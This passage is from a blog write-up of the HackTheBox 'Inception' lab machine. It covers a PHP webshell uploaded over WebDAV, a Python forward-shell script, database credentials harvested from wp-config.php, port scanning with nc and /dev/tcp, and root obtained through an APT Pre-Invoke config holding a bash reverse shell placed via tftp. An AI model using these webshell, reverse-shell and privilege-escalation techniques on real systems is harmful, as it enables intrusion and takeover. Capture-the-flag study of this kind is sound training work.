Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 22464/14344385 (0.16%)
Rejected.........: 0/22464 (0.00%)
Restore.Point....: 22400/14344385 (0.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: boneka -&gt; 171091
Hardware.Mon.#1..: Util: 99%

Started: Sun Oct 22 17:20:47 2023
Stopped: Sun Oct 22 17:21:06 2023
</code></pre><ul><li>We have <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav target=_blank rel=noopener>WebDav</a><ul><li>We could try <code>davtest</code></li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.67/webdav_test_inception
********************************************************
NOTE    Random string for this session: KYt_YHBtL4
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT     cfm     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT     asp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT     jsp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT     php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT     cgi     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT     aspx    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT     jhtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT     shtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT     pl      SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT     html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
EXEC    txt     FAIL
EXEC    cfm     FAIL
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    aspx    FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
</code></pre><ul><li>Let&rsquo;s create a webshell</li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php 
&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;201 Created&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Created&lt;/h1&gt;
&lt;p&gt;Resource /webdav_test_inception/shell.php has been created.&lt;/p&gt;
&lt;hr /&gt;
&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
                            
</code></pre><ul><li>Test it</li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl --data-urlencode &#39;cmd=id&#39; http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><ul><li>But if try to ping, I have nothing</li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl --data-urlencode &#39;cmd=ping -c 1 10.10.16.9&#39; http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php 
PING 10.10.16.9 (10.10.16.9) 56(84) bytes of data.

--- 10.10.16.9 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
</code></pre><ul><li>It could be firewall<ul><li>We could create a <code>forward shell</code> based on this <a href="https://www.youtube.com/watch?v=-ST2FSbqEcU" target=_blank rel=noopener>video</a></li><li>This is the basic template</li></ul></li></ul><pre tabindex=0><code>import requests
import random

class forward_shell(object):
    def __init__(self, url, auth):
        self.url = url
        self.id = random.randrange(10000,99999)
        self.input = f&#34;/dev/shm/stdin.{self.id}&#34;
        self.output = f&#34;/dev/shm/stdout.{self.id}&#34;
        self.auth = auth
        print(f&#34;[+] Starting forward shell with ID:{self.id}...&#34;)

        # Create pipe
        self.execute_raw(f&#34;mkfifo {self.input}&#34;)
        self.execute_raw(f&#34;tail -f {self.input} | /bin/sh 2&gt;&amp;1 &gt; {self.output}&#34;, timeout=0.5)
        print(f&#34;[+] Forward shell with ID:{self.id} has beed initialized...&#34;)
        
        
    def execute_raw(self, cmd, timeout=0.5):
        try:
            resp = requests.post(self.url, data={&#34;cmd&#34;: cmd}, auth=self.auth, timeout=timeout)
        except requests.exceptions.ReadTimeout:
            return None
        return resp.text	
    
    def execute(self, cmd):
        self.execute_raw(f&#34;echo {cmd} &gt; {self.input}&#34;)
        resp = self.execute_raw(f&#34;cat {self.output}; echo -n &gt; {self.output}&#34;)
        return resp
		
    def upgrade_shell(self):
        shell_upgrade = &#34;&#34;&#34;python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; || python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; || script -qc /bin/bash /dev/null&#34;&#34;&#34;
        stty = &#34;stty raw -echo&#34;
        print(self.execute(shell_upgrade))
        print(self.execute(stty))
		
if __name__ == &#34;__main__&#34;:
    url = &#34;http://10.10.10.67/webdav_test_inception/shell.php&#34;
    auth = (&#34;webdav_tester&#34;, &#34;babygurl69&#34;)


    prompt = &#34;$&gt;&#34;
    shell = forward_shell(url, auth)
    while True:
        cmd = input(prompt)
        if cmd == &#34;upgrade&#34;:
            prompt = &#34;&#34;
            shell.upgrade_shell()
        else:
            print(shell.execute(cmd))
</code></pre><ul><li>Our shell works</li></ul><pre tabindex=0><code>‚îî‚îÄ$ python3 forward_shell.py                                                                                                            
[+] Starting forward shell with ID:97412...
[+] Forward shell with ID:97412 has beed initialized...
$&gt;ls
shell.php
webdav.passwd

$&gt;
</code></pre><h2 id=user>User</h2><ul><li>During enumeration we see that we are probably inside container, since <code>ip</code> is different</li></ul><pre tabindex=0><code>$&gt;ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe28:5363/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre><ul><li>Inside <code>/var/www/html</code> we see <code>wordpress</code><ul><li>Let&rsquo;s check the content</li></ul></li></ul><pre tabindex=0><code>$&gt;ls -lha /var/www/html
total 7.9M
drwxr-xr-x 7 root     root     4.0K Aug 10  2022 .
drwxr-xr-x 3 root     root     4.0K Aug 10  2022 ..
-rw-r--r-- 1 root     root      17K May  7  2017 LICENSE.txt
-rw-r--r-- 1 root     root     2.3K May  7  2017 README.txt
drwxr-xr-x 6 root     root     4.0K Aug 10  2022 assets
drwxrwxr-x 4 root     root     4.0K Aug 10  2022 dompdf
drwxr-xr-x 2 root     root     4.0K Aug 10  2022 images
-rw-r--r-- 1 root     root     2.9K Nov  6  2017 index.html
-rw-r--r-- 1 root     root     7.9M Oct 31  2017 latest.tar.gz
drwxr-xr-x 2 www-data www-data 4.0K Oct 23 16:42 webdav_test_inception
drwxr-xr-x 5 root     root     4.0K Aug 10  2022 wordpress_4.8.3
</code></pre><ul><li>We have creds inside <code>wp-config.php</code></li></ul><pre tabindex=0><code>$&gt;cat /var/www/html/wordpress_4.8.3/wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);

/** MySQL database username */
define(&#39;DB_USER&#39;, &#39;root&#39;);

/** MySQL database password */
define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;);

/** MySQL hostname */
define(&#39;DB_HOST&#39;, &#39;localhost&#39;);

/** Database Charset to use in creating database tables. */
define(&#39;DB_CHARSET&#39;, &#39;utf8&#39;);

/** The Database Collate type. Don&#39;t change this if in doubt. */
define(&#39;DB_COLLATE&#39;, &#39;&#39;);
...
</code></pre><ul><li>We see port <code>22</code> is open</li></ul><pre tabindex=0><code>$&gt;netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::3128                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:45347           0.0.0.0:*                           -               
udp6       0      0 :::36360                :::*                                -               
</code></pre><ul><li>So let&rsquo;s use <code>squid</code> to test the creds<ul><li>Using creds to login as <code>coby</code> via <code>proxychains</code> works</li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ proxychains sshpass -p &#39;VwPddNh7xMZyDQoByQL4&#39; ssh cobb@127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Warning: Permanently added &#39;127.0.0.1&#39; (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ 
</code></pre><h2 id=container-root>Container Root</h2><ul><li><code>sudo</code></li></ul><pre tabindex=0><code>cobb@Inception:~$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
</code></pre><pre tabindex=0><code>cobb@Inception:~$ sudo su
root@Inception:/home/cobb# 
</code></pre><h2 id=root>Root</h2><ul><li>Since we are inside container, let&rsquo;s perform a ping sweep</li></ul><pre tabindex=0><code>root@Inception:/home/cobb# for i in {1..254}; do (ping -c 1 192.168.0.$i | grep &#34;bytes from&#34; &amp;); done
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.039 ms
</code></pre><ul><li>We can enumerate ports using 2 methods</li></ul><pre tabindex=0><code>root@Inception:/home/cobb# nc -zv 192.168.0.1 1-65535 2&gt;&amp;1 | grep -v refused
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
</code></pre><pre tabindex=0><code>root@Inception:/home/cobb# for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.0.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &#34;$i is open&#34;; done
21 is open
22 is open
53 is open
</code></pre><ul><li>We have <code>ftp</code>, <code>ssh</code> and <code>dns</code> ports open<ul><li>Let&rsquo;s start with <code>ftp</code></li></ul></li></ul><pre tabindex=0><code>root@Inception:/home/cobb# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 10  2022 bin
drwxr-xr-x    3 0        0            4096 Aug 10  2022 boot
drwxr-xr-x   18 0        0            3780 Oct 23 16:18 dev
drwxr-xr-x   93 0        0            4096 Aug 10  2022 etc
drwxr-xr-x    3 0        0            4096 Aug 10  2022 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -&gt; boot/initrd.img-4.4.0-101-generic
drwxr-xr-x   22 0        0            4096 Aug 10  2022 lib
drwxr-xr-x    2 0        0            4096 Aug 10  2022 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 10  2022 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  221 0        0               0 Oct 23 16:18 proc
drwx------    6 0        0            4096 Aug 10  2022 root
drwxr-xr-x   26 0        0             900 Oct 23 16:18 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Aug 10  2022 snap
drwxr-xr-x    3 0        0            4096 Aug 10  2022 srv
dr-xr-xr-x   13 0        0               0 Oct 23 17:04 sys
drwxrwxrwt   10 0        0            4096 Oct 23 17:25 tmp
drwxr-xr-x   10 0        0            4096 Aug 10  2022 usr
drwxr-xr-x   13 0        0            4096 Aug 10  2022 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-101-generic
226 Directory send OK.
</code></pre><ul><li>We can&rsquo;t write<ul><li>So let&rsquo;s continue enumeration</li><li>We can <code>ssh</code> as <code>cobb</code> to host machine</li></ul></li></ul><pre tabindex=0><code>oot@Inception:/home/cobb# ssh cobb@192.168.0.1
The authenticity of host &#39;192.168.0.1 (192.168.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:zj8NiAd9po8KKA/z7MGKjn7j6wPFpA2Y6bDTRecUrdE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.0.1&#39; (ECDSA) to the list of known hosts.
cobb@192.168.0.1&#39;s password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

cobb@Inception:~$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:04:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.67/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:467/64 scope global mngtmpaddr dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:467/64 scope link 
       valid_lft forever preferred_lft forever
3: lxdbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.1/24 scope global lxdbr0
       valid_lft forever preferred_lft forever
    inet6 fe80::d864:a1ff:fe41:8ff/64 scope link 
       valid_lft forever preferred_lft forever
5: vethD0K6BC@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master lxdbr0 state UP group default qlen 1000
    link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fca2:b8ff:fea9:45e7/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre><ul><li>We see a cronjob every 5 min is executed</li></ul><pre tabindex=0><code>cobb@Inception:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2&gt;&amp;1 &gt;/dev/null
</code></pre><ul><li>By the way we have a <code>tftpd</code><ul><li>If we scanned <code>udp</code>, we would&rsquo;ve noticed it<ul><li><code>nc -uzv 192.168.0.1 1-65535 2>&amp;1 | grep -v refused</code></li></ul></li></ul></li></ul><pre tabindex=0><code>cobb@Inception:~$ ls -lha /etc/init.d/
total 316K
drwxr-xr-x  2 root root 4.0K Aug 10  2022 .
...
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1.1K Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4.0K Mar 16  2017 ssh
-rwxr-xr-x  1 root root 2.1K Mar 24  2017 tftpd-hpa
...
</code></pre><pre tabindex=0><code>cobb@Inception:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.0.1:53          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 fe80::d864:a1ff:fe41:53 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:2682            0.0.0.0:*                           -               
udp        0      0 192.168.0.1:53          0.0.0.0:*                           -               
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
udp6       0      0 fe80::d864:a1ff:fe41:53 :::*                                -               
udp6       0      0 :::69                   :::*                                -    
</code></pre><ul><li>Back to the cronjob<ul><li>We saw that <code>apt update</code> is executed every 5 minutes</li><li>We can create a config file with <code>Pre-Invoke</code> containing reverse shell<ul><li><a href=https://gtfobins.github.io/gtfobins/apt-get/ target=_blank rel=noopener>https://gtfobins.github.io/gtfobins/apt-get/</a></li></ul></li><li>But we also need to place our config inside <code>/etc/apt/apt.conf.d/</code></li><li>This is where <code>tftpd</code> will help us<ul><li>Since it is running as <code>root</code></li></ul></li><li>Check <code>/etc/default</code></li></ul></li></ul><pre tabindex=0><code>TFTP_USERNAME=&#34;root&#34;
TFTP_DIRECTORY=&#34;/&#34;
TFTP_ADDRESS=&#34;:69&#34;
TFTP_OPTIONS=&#34;--secure --create&#34;
</code></pre><ul><li>Let&rsquo;s create a config and place it via <code>tftpd</code><ul><li>Create a file with <code>APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/192.168.0.10/6666 0>&amp;1'"}</code></li></ul></li></ul><pre tabindex=0><code>root@Inception:/home/cobb# tftp 192.168.0.1
tftp&gt; put /home/cobb/rooted /etc/apt/apt.conf.d/rooted
Sent 77 bytes in 0.0 seconds
</code></pre><pre tabindex=0><code>cobb@Inception:~$ ls -lha /etc/apt/apt.conf.d/
total 56K
drwxr-xr-x 2 root root 4.0K Oct 23 17:43 .
drwxr-xr-x 6 root root 4.0K Aug 10  2022 ..
-rw-r--r-- 1 root root   49 Oct 30  2017 00aptitude
-rw-r--r-- 1 root root   82 Oct 30  2017 00CDMountPoint
-rw-r--r-- 1 root root   40 Oct 30  2017 00trustcdrom
-rw-r--r-- 1 root root  769 Apr 14  2016 01autoremove
-r--r--r-- 1 root root 2.9K Aug 10  2022 01autoremove-kernels
-rw-r--r-- 1 root root   42 Apr 14  2016 01-vendor-ubuntu
-rw-r--r-- 1 root root  129 May 24  2016 10periodic
-rw-r--r-- 1 root root  108 May 24  2016 15update-stamp
-rw-r--r-- 1 root root   85 May 24  2016 20archive
-rw-r--r-- 1 root root  182 Nov 10  2015 70debconf
-rw-r--r-- 1 root root  305 May 24  2016 99update-notifier
-rw-rw-rw- 1 root root   76 Oct 23 17:43 rooted
</code></pre><ul><li>After few minutes, we receive our shell</li></ul><pre tabindex=0><code>root@Inception:/home/cobb# nc -lvnp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from [192.168.0.1] port 6666 [tcp/*] accepted (family 2, sport 33834)
bash: cannot set terminal process group (13877): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp#
</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2finception%2f&text=%5bHTB%5d%20Machine%3a%20Inception&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
</a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2finception%2f&title=%5bHTB%5d%20Machine%3a%20Inception" target=_blank><i class="fab fa-reddit"></i>
</a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2finception%2f&title=%5bHTB%5d%20Machine%3a%20Inception" target=_blank><i class="fab fa-linkedin"></i>
</a><a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Inception&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2finception%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/inception/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Horizontall</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Inject</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#container-root>Container Root</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">¬© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.1f9ecfc54b730529ffdf2e314da715a7d9bae90419d14f6eee294a84b6f1247a.js integrity="sha256-H57PxUtzBSn/3y4xTacVp9m66QQZ0U9u7ilKhLbxJHo=" defer></script></body></html>